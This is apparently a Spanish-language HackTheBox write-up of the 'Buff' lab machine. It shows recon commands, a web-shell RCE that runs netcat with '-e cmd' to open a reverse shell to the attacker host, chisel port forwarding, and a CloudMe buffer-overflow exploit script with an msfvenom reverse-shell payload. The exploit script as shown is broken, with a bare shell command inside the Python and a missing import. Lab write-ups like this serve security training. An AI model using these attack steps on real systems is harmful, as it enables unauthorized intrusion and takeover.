---
title: Buff | Windows
published: 2025-08-12
image: "./logo.png"
tags: [Easy, Windows, RCE, Buffer Overflow, Python Scripting, OSCP, eCPPTv3]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Gym Management System Exploitation (RCE)
- CloudMe Exploitation [Buffer Overflow] [OSCP Like] (Manual procedure) [Python Scripting]

### Preparación

- OSCP
- eCPPTv3
- Buffer Overflow

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.198 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.198`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT     STATE SERVICE    REASON
7680/tcp open  pando-pub  syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p7680,8080 10.10.10.198 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.198`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
❯ whatweb http://10.10.10.198:8080
http://10.10.10.198:8080 [200 OK] Apache[2.4.43], Bootstrap, Cookies[sec_session_id], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], HttpOnly[sec_session_id], IP[10.10.10.198], JQuery[1.11.0,1.9.1], OpenSSL[1.1.1g], PHP[7.4.6], PasswordField[password], Script[text/JavaScript,text/javascript], Shopify, Title[mrb3n's Bro Hut], Vimeo, X-Powered-By[PHP/7.4.6], X-UA-Compatible[IE=edge]
```

### Gym Management System (8080)

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fzd7UoGwKGM3Oen0zjEVT%2Fimage.png?alt=media&#x26;token=29f72a66-e515-4438-9116-850f7987e1d9" alt=""><figcaption></figcaption></figure>

## Explotación

Si buscamos exploits sobre este sistema encontraremos un **RCE**:

```bash wrap=false
❯ searchsploit gym management system
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                                                                                       | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                                    | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                                              | php/webapps/48941.txt
-> Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                                    | php/webapps/48506.py
GYM MS - GYM Management System - Cross Site Scripting (Stored)                                                                                       | php/webapps/51777.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Resumidamente este script sube una imagen falsa que nos da acceso a ejecución remota de comandos desde la siguiente ruta:

```
view-source:http://10.10.10.198:8080/upload/kamehameha.php?telepathy=[comando]
```

Sabiendo esto lo ideal sería descargar **netcat** para Windows y compartirlo a la máquina víctima de la siguiente manera:

```bash title="Iniciar servidor local SMB"
smbserver.py smbFolder $(pwd) -smb2support
```

```bash title="Nos ponemos a la escucha desde nuestra máquina"
sudo rlwrap nc -lvnp 443
```

```bash title="Usamos NC para enviar una reverse shell"
view-source:http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443
```

```bash title="Conseguimos la flag del usuario"
C:\Users\shaun\Desktop>type user.txt
9a0dffd97e222244...
```

## Escalada de privilegios

Para comenzar la escalada de privilegios, crearemos un directorio temporal y descargaremos:

### WinPEAS.exe

```bash
File Permissions "C:\Users\shaun\Downloads\CloudMe_1112.exe": shaun [Allow: AllAccess]
```

Esto es lo más interesante que encuentro, si buscamos que es vemos que corre en el puerto **8888**.

```bash
C:\temp>netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State  
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       InHost      
```

Efectivamente, vemos que está corriendo en la máquina de manera local, vamos a buscar un **exploit**:

```bash wrap=false
❯ searchsploit cloudme
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                               | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                      | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                      | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                                     | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                              | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                                       | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                          | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                                      | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                             | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                              | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                           | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Buffer Overflow

Vemos muchos de **Buffer Overflow**, vamos a probar el primero a ver de qué trata:

```python title="Buffer Overflow exploit modificado con Reverse shell" wrap=false
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

Para poder acceder a este puerto deberemos hacer **port forwarding**, en este caso lo haremos con la herramienta **chisel** y nos pondremos como servidor desde nuestra máquina atacante con el siguiente comando:

```bash
./chisel server --reverse -p 1234
```

Y desde la máquina víctima usaremos este comando para redirigir el puerto:

```bash
chisel.exe client 10.10.14.5:1234 R:8888
```

De esta manera lo que conseguimos es tener en nuestro puerto local **1234** el de la máquina víctima **8888**.

Teniendo todo listo simplemente ejecutamos el script después de habernos puesto a la escucha en nuestra máquina atacante, y recibiremos la máquina como **Administrator**:

```bash
C:\Users\Administrator\Desktop>type root.txt
649bfd7dcf8c4005...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/263)

---